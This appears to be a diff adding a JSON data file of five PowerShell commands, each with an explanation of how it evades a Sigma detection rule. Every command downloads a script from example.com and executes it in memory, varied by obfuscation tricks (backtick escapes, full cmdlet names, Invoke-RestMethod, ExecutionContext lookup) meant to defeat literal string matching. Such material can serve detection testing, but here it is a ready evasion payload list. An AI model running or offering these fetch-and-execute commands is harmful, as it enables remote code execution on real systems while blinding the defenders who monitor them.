@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -Command \"$wc = New-Object System.Net.WebClient; IEX $wc.DownloadString('http://example.com/test.ps1')\"",
+    "explanation": "By assigning the WebClient object to a variable first, the contiguous string pattern defined in the Sigma rule is broken, successfully bypassing the exact literal match."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-Expression ((New-Object Net.WebClient).DownloadString('http://example.com/test.ps1'))\"",
+    "explanation": "The Sigma rule specifically targets the 'IEX' alias. Replacing it with the full cmdlet name 'Invoke-Expression' circumvents the detection logic."
+  },
+  {
+    "output": "powershell.exe -Command \"I`EX ((New-Object Net.WebClient).DownloadString('http://example.com/test.ps1'))\"",
+    "explanation": "Using PowerShell's backtick escape character obfuscates the command string. The interpreter ignores the backtick, but the SIEM's literal string match fails to recognize the 'IEX' string."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX (Invoke-RestMethod -Uri 'http://example.com/test.ps1')\"",
+    "explanation": "Using a modern native PowerShell cmdlet like Invoke-RestMethod entirely avoids the use of the .NET Net.WebClient class, rendering the rule's specific string patterns ineffective."
+  },
+  {
+    "output": "powershell.exe -Command \"& ( $ExecutionContext.InvokeCommand.GetCmdlet( 'Invoke-Expression' ) ) ( (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1') )\"",
+    "explanation": "Invoking the command through the ExecutionContext dynamically retrieves the cmdlet without explicitly writing 'IEX' in a way that matches the rule's syntax."
+  }
+]
